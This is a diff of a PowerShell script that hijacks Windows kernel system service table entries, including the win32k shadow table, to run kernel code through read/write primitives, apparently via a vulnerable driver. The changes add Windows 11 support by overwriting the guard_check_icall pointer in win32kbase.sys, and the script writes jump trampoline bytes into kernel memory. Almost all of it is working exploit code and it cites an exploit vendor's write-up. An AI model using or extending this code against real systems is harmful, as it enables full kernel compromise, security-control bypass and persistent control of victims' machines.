@@ -6761,7 +6761,7 @@ Function Invoke-SsdtCallbackHijack {
     # -----------------------------------------------------------------
 
     $DriverBase = Resolve-DriverAddress  -DriverName $Driver
-    $TableRVA   = Resolve-SymbolFromFile -DllName $Driver -FunctionName W32pServiceTable       | Select -ExpandProperty RVA
+    $TableRVA   = Resolve-SymbolFromFile -DllName $Driver -FunctionName W32pServiceTable     | Select -ExpandProperty RVA
     $StubRVA    = Resolve-SymbolFromFile -DllName $Driver -FunctionName "__win32kstub_$Hook" | Select -ExpandProperty RVA
 
     $TableVA    = [IntPtr]::Add($DriverBase, $TableRVA)
@@ -6832,7 +6832,8 @@ Function Invoke-SsdtCallbackHijack {
     }
 }
 # NTOSKRNL Hijack [Shaddow table]
-# // W10 only
+# W10, Work Fine
+# W11, Dependend on kaslr randomize & God
 Function Invoke-SsdtShadowCallHijack {
     param (
         [Parameter(Mandatory = $true)]
@@ -6859,23 +6860,28 @@ Function Invoke-SsdtShadowCallHijack {
         7  { $Hook = "NtUserToUnicodeEx"           }
         8  { $Hook = "NtUserSetWinEventHook"       }
         9  { $Hook = "NtUserInitTask"              }
-		10 { $Hook = "NtUserInitTask"              }
+        10 { $Hook = "NtUserInitTask"              }
         11 { $Hook = "NtUserInitTask"              }
         12 { $Hook = "NtUserInitTask"              }
         default {
             Write-Warning "No pre-configured quiet hook for $ParamCount parameters. Using: $Hook"
         }
     }
-       
 
-    # Shadow SSDT Hijacking- Achieving Kernel Code Execution via Read-Write – Exploit Pack
+    # Shadow SSDT Hijacking- Achieving Kernel Code Execution via Read-Write â€“ Exploit Pack
     # https://www.exploitpack.com/blogs/news/shadow-ssdt-hijacking-to-achieve-kernel-code-execution-via-rw-primitives
+
+    # Notepad++, Regex Search
+    # mov\s+rax,\s+cs:[^\r\n]*(?:\r?\n[^\r\n]*){0,8}?\s+call\s+rax
 
     $osBuild = [Marshal]::ReadInt32(0x7FFE0000, 0x260)
     $osBuild = (Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion").CurrentBuild
     if ($osBuild -ge 22000) {
-        Write-Warning "Not Supported in new Windows 11 Build's"
-        return
+        try {
+            Resolve-SymbolFromPdb -BinaryPath C:\Windows\System32\win32kbase.sys -FunctionName guard_check_icall | Out-Null
+        } catch {
+            throw "guard_check_icall not found, cant find any hope"
+        }
     }
 
     $Data    = Resolve-SymbolFromFile -DllName win32u.dll -FunctionName $Hook | select -ExpandProperty Bytes
@@ -6899,43 +6905,106 @@ Function Invoke-SsdtShadowCallHijack {
     $EntryAddress = $ShadowTableBase + ($Index * 4)
     $EncodedEntry = Read-VirtualAddress -VA $EntryAddress -AsInt
 
-    $RVA   = Resolve-SymbolFromFile -DllName win32k.sys -FunctionName __win32kstub_NtUserGetClipCursor | select -ExpandProperty RVA
-    $Win32 = Resolve-DriverAddress -DriverName win32k.sys 
-    $Clip  = [IntPtr]::Add($Win32, $RVA)
-
-    $TotalParams     = if ($null -ne $Values) { $Values.Count } else { 0 }
-    $StackParams     = if ($TotalParams -gt 4) { $TotalParams - 4 } else { 0 }
-    $NewEncodedEntry = [int32]((($Clip - $ShadowTableBase) -shl 4) -bor $StackParams)
-
-    $RVA = Resolve-SymbolFromPdb -FunctionName $Function
-    $TargetAddress = [IntPtr]::Add($KerBase, $RVA)
-    $AddressBytes = [System.BitConverter]::GetBytes([Int64]$TargetAddress)
-    $InstructionPrefix = [Byte[]] @(0x48, 0xB8)
-    $InstructionEnd    = [Byte[]] @(0xFF, 0xE0)
-    $FinalInstruction  = $InstructionPrefix + $AddressBytes + $InstructionEnd
-
-    $backupArray = New-Object byte[] 16
-    $AddressBytes = [System.BitConverter]::GetBytes([int64]$Clip)
-    $UnsignedAddress = [System.BitConverter]::ToUInt64($AddressBytes, 0)
-    $ProcID = (Get-Process -Name explorer).Id
-
-    $ClipPa = Resolve-DirectoryTable -VA $UnsignedAddress -ProcessID $ProcID
-    if ($ClipPa -eq $null -or $ClipPa -eq 0) {
-        throw "Fail to Get PA Address"
+    if ($osBuild -ge 22000) {
+        $wBase   = Resolve-DriverAddress -DriverName win32kbase.sys
+        $RtRVA   = Resolve-SymbolFromPdb -BinaryPath C:\Windows\System32\win32kbase.sys -FunctionName guard_check_icall
+        $Address = [IntPtr]::Add($wBase, $RtRVA)
+    } else {
+        $RVA      = Resolve-SymbolFromFile -DllName win32k.sys -FunctionName __win32kstub_NtUserGetClipCursor | select -ExpandProperty RVA
+        $Win32    = Resolve-DriverAddress  -DriverName win32k.sys 
+        $Address  = [IntPtr]::Add($Win32, $RVA)
     }
 
-    $va = Map-VirtualAddress -PA $ClipPa -BlockSize 16 -DriverName ktapi
-    if ($null -ne $va -and $va -ne 0L) {
-        $Address = try { [IntPtr]$va } catch { [IntPtr]$va.MappedAddress }
-        [Marshal]::Copy($Address, $BackupArray, 0, $BackupArray.Length)
+    $TotalParams     = if ($null -ne $Values ) { $Values.Count    } else { 0 }
+    $StackParams     = if ($TotalParams -gt 4) { $TotalParams - 4 } else { 0 }
+    try {
+        $NewEncodedEntry = [int32]((($Address - $ShadowTableBase) -shl 4) -bor $StackParams)
+    } catch {
+        Write-Error "Shadow space exhausted. Reboot to reshuffle KASLR."
+        return
+    }
+    
+    if ($osBuild -ge 22000) {
+        
+        $Index    = -1
+        $Pattern  = @(0x48, 0x8B, 0x05)
+        $Data     = Read-VirtualAddress -VA $Address -BlockSize 0x28
 
-        # This part, fail on windows 11, so, keep it first
-        # If it fail, no harmfull change will happen to kernel.
-        [marshal]::Copy($FinalInstruction, 0, $Address, $FinalInstruction.Length)
+        for ($i = 0; $i -le ($Data.Length - 4); $i++) {
+            if ($Data[$i] -eq 0x48 -and $Data[$i+1] -eq 0x8B -and $Data[$i+2] -eq 0x05) {
+                $Index = $i
+                break
+            }
+        }
 
-        Unmap-VirtualAddress -MappedAddress $va -DriverName ktapi | Out-Null
+        if ($Index -ne -1) {
+            # The 4-byte displacement immediately follows the 3-byte opcode
+            $DispIndex = $Index + 3
+            $Displacement = [System.BitConverter]::ToInt32($Data, $DispIndex)
+        
+            # The instruction length for mov rax, [rip+disp32] is 7 bytes (3 opcode + 4 disp)
+            # RIP points to the instruction *after* this one
+            $InstructionLength = 7
+            $NextInstructionVA = [IntPtr]::Add($Address, $Index + $InstructionLength)
+            $TargetPointerVA   = [IntPtr]::Add($NextInstructionVA, $Displacement)
+        } else {
+            throw "Could not found Address"
+        }
+
+        $RVA = Resolve-SymbolFromPdb -FunctionName $Function
+        if ($RVA -eq $null -or $RVA -eq 0L) {
+            throw "FAil to find RVA"
+        }
+
+        # Not in use !
+        $TargetAddress     = [IntPtr]::Add($KerBase, $RVA)
+        $AddressBytes      = [System.BitConverter]::GetBytes([Int64]$TargetAddress)
+        
+        $OrigionalValue = 0L
+        $BindObj = Bind-KernelAddress -VA $TargetPointerVA
+        if ($BindObj -ne $null) {
+            $TmpAddr = [IntPtr]::Add($BindObj.BaseVA, $BindObj.ByteOffset)
+            $OrigionalValue = [marshal]::ReadInt64($TmpAddr)
+            [marshal]::Copy($AddressBytes, 0, $TmpAddr, 8)
+            Bind-KernelAddress -Package $BindObj -Release
+        }
+
+        $State = Get-RecoveryState -RegPath "HKCU:\Software\StateRecoveryManager3"
+        if ($State.RecoverFlag) {
+            $OrigionalValue = [Int64]::Parse($State.Value)
+            Write-Warning "OrigionalValue ($OrigionalValue) Recovered After ISE Crash"
+        }
+        Set-RecoveryState -RegPath "HKCU:\Software\StateRecoveryManager3" -Value $OrigionalValue -Status "Pending"
+
     } else {
-        $backupArray = $null
+
+        $RVA = Resolve-SymbolFromPdb -FunctionName $Function
+        $TargetAddress = [IntPtr]::Add($KerBase, $RVA)
+        $AddressBytes = [System.BitConverter]::GetBytes([Int64]$TargetAddress)
+        $InstructionPrefix = [Byte[]] @(0x48, 0xB8)
+        $InstructionEnd    = [Byte[]] @(0xFF, 0xE0)
+        $FinalInstruction  = $InstructionPrefix + $AddressBytes + $InstructionEnd
+
+        $backupArray = New-Object byte[] 16
+        $AddressBytes = [System.BitConverter]::GetBytes([int64]$Address)
+        $UnsignedAddress = [System.BitConverter]::ToUInt64($AddressBytes, 0)
+        $ProcID = (Get-Process -Name explorer).Id
+
+        $AddressPa = Resolve-DirectoryTable -VA $UnsignedAddress -ProcessID $ProcID
+        if ($AddressPa -eq $null -or $AddressPa -eq 0) {
+            throw "Fail to Get PA Address"
+        }
+
+        $va = Map-VirtualAddress -PA $AddressPa -BlockSize 16 -DriverName ktapi
+        if ($null -ne $va -and $va -ne 0L) {
+            $Address = try { [IntPtr]$va } catch { [IntPtr]$va.MappedAddress }
+            [Marshal]::Copy($Address, $BackupArray, 0, $BackupArray.Length)
+            [marshal]::Copy($FinalInstruction, 0, $Address, $FinalInstruction.Length)
+
+            Unmap-VirtualAddress -MappedAddress $va -DriverName ktapi | Out-Null
+        } else {
+            $backupArray = $null
+        }
     }
 
     $MapObj = Map-KernelMemory -VA $EntryAddress -Size 4 -Mode gibepext -CacheType MmCached
@@ -6961,8 +7030,16 @@ Function Invoke-SsdtShadowCallHijack {
             Free-IntPtr -handle $MapObj.Device -Method NtHandle
         }
 
-        if ($backupArray) {
-            $va = Map-VirtualAddress -PA $ClipPa -BlockSize 16 -DriverName ktapi
+        if ($osBuild -ge 22000) {
+            $BindObj = Bind-KernelAddress -VA $TargetPointerVA
+            if ($BindObj -ne $null) {
+                $TmpAddr = [IntPtr]::Add($BindObj.BaseVA, $BindObj.ByteOffset)
+                [marshal]::WriteInt64($TmpAddr, $OrigionalValue)
+                Bind-KernelAddress -Package $BindObj -Release
+                Set-RecoveryState -RegPath "HKCU:\Software\StateRecoveryManager3" -Status Succeed
+            }
+        } elseif ($backupArray) {
+            $va = Map-VirtualAddress -PA $AddressPa -BlockSize 16 -DriverName ktapi
             if ($null -ne $va -and $va -ne 0L) {
                 $Address = try { [IntPtr]$va } catch { [IntPtr]$va.MappedAddress }
                 [marshal]::Copy($backupArray, 0, $Address, $backupArray.Length)
@@ -7002,10 +7079,6 @@ Function Invoke-SsdtNtCallHijack {
 
     $EntryAddress = [IntPtr]::Add($ServiceBase, ($SysCallVal * 4))
     $EntryValue   = Read-VirtualAddress -VA $EntryAddress -AsInt
-
-    #$RealOffset = $EntryValue -shr 4
-    #Read-VirtualAddress -VA ([IntPtr]::Add($ServiceBase, $RealOffset)) -BlockSize 96 | 
-    #    Format-HexView -Mode 16x
 
     $TotalParams = if ($null -ne $Values)  { $Values.Count    } else { 0 }
     $StackParams = if ($TotalParams -gt 4) { $TotalParams - 4 } else { 0 }
@@ -7099,16 +7172,25 @@ Function Invoke-SsdtNtCallHijack {
     Set-RecoveryState -Value $EntryValue -Status "Pending"
 
     try {
-        $MapObj = Map-KernelMemory `
-            -VA $EntryAddress `
-            -Size 4 -Mode gibepext `
-            -CacheType MmCached
-        if ($MapObj.MappedAddress -ne 0) {
-            $HR = Write-VirtualAddress `
-                -VA $MapObj.MappedAddress `
-                -Int $NewOffset
-            #Write-Warning "Results: $HR"
+        <# 
+            $MapObj = Map-KernelMemory `
+                -VA $EntryAddress `
+                -Size 4 -Mode gibepext `
+                -CacheType MmCached
+            if ($MapObj.MappedAddress -ne 0) {
+                $HR = Write-VirtualAddress `
+                    -VA $MapObj.MappedAddress `
+                    -Int $NewOffset
+                #Write-Warning "Results: $HR"
+            } 
+        #>
+        $MapObj = Bind-KernelAddress -VA $EntryAddress
+        if ($MapObj -ne $null) {
+            $TargetVA = [IntPtr]::Add($MapObj.BaseVA, $MapObj.ByteOffset)
+            [marshal]::WriteInt32($TargetVA, $NewOffset)
+            Bind-KernelAddress -Package $MapObj -Release
         }
+
     } finally {
         Free-IntPtr `
             -handle $MapObj.Device `
@@ -7134,15 +7216,23 @@ Function Invoke-SsdtNtCallHijack {
         }
     } Finally {
         try {
-            $MapObj = Map-KernelMemory `
-                -VA $EntryAddress `
-                -Size 4 -Mode gibepext `
-                -CacheType MmCached
-            if ($MapObj.MappedAddress -ne 0) {
-                $HR = Write-VirtualAddress `
-                    -VA $MapObj.MappedAddress `
-                    -Int $EntryValue
-                #Write-Warning "Results: $HR"
+            <#
+                $MapObj = Map-KernelMemory `
+                    -VA $EntryAddress `
+                    -Size 4 -Mode gibepext `
+                    -CacheType MmCached
+                if ($MapObj.MappedAddress -ne 0) {
+                    $HR = Write-VirtualAddress `
+                        -VA $MapObj.MappedAddress `
+                        -Int $EntryValue
+                    #Write-Warning "Results: $HR"
+                }
+            #>
+            $MapObj = Bind-KernelAddress -VA $EntryAddress
+            if ($MapObj -ne $null) {
+                $TargetVA = [IntPtr]::Add($MapObj.BaseVA, $MapObj.ByteOffset)
+                [marshal]::WriteInt32($TargetVA, $EntryValue)
+                Bind-KernelAddress -Package $MapObj -Release
             }
         } finally {
             Free-IntPtr `
